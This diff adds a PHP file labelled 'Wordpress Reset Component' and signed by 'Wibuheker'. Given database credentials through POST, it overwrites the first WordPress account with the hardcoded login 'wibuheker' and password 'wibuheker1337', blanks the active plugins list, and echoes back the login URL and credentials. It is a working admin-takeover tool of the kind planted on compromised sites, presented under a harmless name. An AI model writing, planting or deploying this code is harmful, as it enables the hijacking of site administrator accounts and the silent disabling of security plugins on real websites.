@@ -1,0 +1,48 @@
+<?php
+/**
+ * @Wibuheker | Wordpress Reset Component
+ */
+$dbhost = @$_POST['host'];
+$dbuser = @$_POST['user'];
+$dbpass = @$_POST['pass'];
+$dbname = @$_POST['db'];
+$dbprefix = @$_POST['prefix'];
+$user = 'wibuheker';
+$pass = 'wibuheker1337';
+if (!empty($dbhost)) {
+    try{
+        $userPrefix = $dbprefix . "users";
+        $optionsPrefix = $dbprefix . "options";
+        $DB = new \PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+        $USR_SQL = "SELECT * FROM $userPrefix ORDER BY id ASC";
+        $OPT_SQL = "SELECT * FROM $optionsPrefix ORDER BY option_id ASC";
+        $Execute = $DB->prepare($USR_SQL);
+        $Execute->execute();
+        $row = $Execute->fetch();
+        $Exec = $DB->prepare($OPT_SQL);
+        $Exec->execute();
+        $row2 = $Exec->fetch();
+        if ($row2['option_value'] == '') {
+            $url = "FAILED TO FETCH URL";
+        } else {
+            $url = $row2['option_value'] . "/wp-login.php";
+        }
+        $UPTD_SQL = "UPDATE $userPrefix SET user_login=:username, user_pass=:passwd WHERE id=:id";
+        $Ecut = $DB->prepare($UPTD_SQL);
+        $Ecut->execute([':username' => $user, ':passwd' => md5($pass), ':id' => $row['ID']]);
+        $Exe = $DB->prepare("UPDATE $optionsPrefix SET option_value='' WHERE option_name='active_plugins'");
+        $Exe->execute();
+        echo json_encode(array(
+            'outcome' => true,
+            'message' => 'Success Update Data!',
+            'login' => $url,
+            'user' => $user,
+            'pass' => $pass
+        ));
+    } catch(Exception $e) {
+        die(json_encode(array(
+            'outcome' => false,
+            'message' => $e->getMessage()
+        )));
+    }
+}
